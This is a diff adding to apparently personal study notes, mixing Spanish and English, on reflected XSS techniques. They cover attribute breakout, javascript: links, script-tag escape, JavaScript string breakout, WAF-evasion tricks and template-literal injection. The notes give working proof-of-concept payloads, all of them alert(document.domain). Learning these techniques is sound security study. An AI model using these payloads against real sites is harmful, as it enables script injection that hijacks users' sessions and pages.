@@ -24,6 +24,42 @@ Donde se aparece la informacion que podemos manipular y por lo tanto un script q
 
 ```
 
+Cuando los angle brakets estan  bloqueados
+
+```
+
+" autofocus onfocus=alert(document.domain) x="
+
+```
+> The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=" to gracefully repair the following markup.
+
+
+### HREF atribute
+
+```
+
+<a href="javascript:alert(document.domain)">
+
+```
+
+### Inside a script
+
+```
+<script>
+...
+var input = 'controllable data here';
+...
+</script>
+
+```
+Para explotar este podrias una img para ejecutar tu propio script
+
+```
+
+</script><img src=1 onerror=alert(document.domain)>
+
+```
+
 ### XSS in HTML tag attributes
 
 >  close the tag, and introduce a new one.
@@ -34,7 +70,99 @@ Donde se aparece la informacion que podemos manipular y por lo tanto un script q
 
 ```
 
+### Breaking out of a JavaScript string
 
+> In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.
+
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+
+### Angle Brackets encoded
+
+por ejemplo al estar dentro de un script podrias cerrar las comillas y generar algo como esto
+
+```
+var a = ''-alert(1)-''
+
+```
+
+Cuando te encuentras detras de un WAF podrias tener caracteres restringidos para eso se usa 
+
+```
+
+onerror=alert;throw 1
+
+```
+
+#### throw
+
+Lanza una excepcion definida por el usuario.
+
+Por ejemplo:
+
+```
+
+throw "Error2"; // genera una excepción con un valor cadena
+throw 42; // genera una excepción con un valor 42
+throw true; // genera una excepción con un valor true
+
+```
+
+### Usando el URL encode
+
+For example, if the XSS context is as follows:
+
+```
+<a href="#" onclick="... var input='controllable data here'; ...">
+```
+```
+
+&apos;-alert(document.domain)-&apos;
+
+````
+
+### Contexto de Plantillas literales ( JavaScript template literals )
+
+> Las plantillas literales son cadenas literales que habilitan el uso de expresiones incrustadas. Con ellas, es posible utilizar cadenas de caracteres de más de una línea, y funcionalidades de interpolación de cadenas de caracteres.
+
+```
+`texto de cadena de caracteres`
+
+`línea 1 de la cadena de caracteres
+ línea 2 de la cadena de caracteres`
+
+`texto de cadena de caracteres ${expresión} texto adicional`
+
+etiqueta`texto de cadena de caracteres ${expresión} texto adicional`
+
+````
+
+For example, the following script will print a welcome message that includes the user's display name:
+
+```
+
+document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
+
+``` 
+
+```
+<script>
+...
+var input = `controllable data here`;
+...
+</script>
+
+```
+
+```
+${alert(document.domain)}
+
+```
+y se ejcutaria el codigo js
+
+### XSS in the context of the AngularJS sandbox (pendiente hasta que no domines mas esto
 
 # XSS almacenado (Stored cross-site scripting)
 
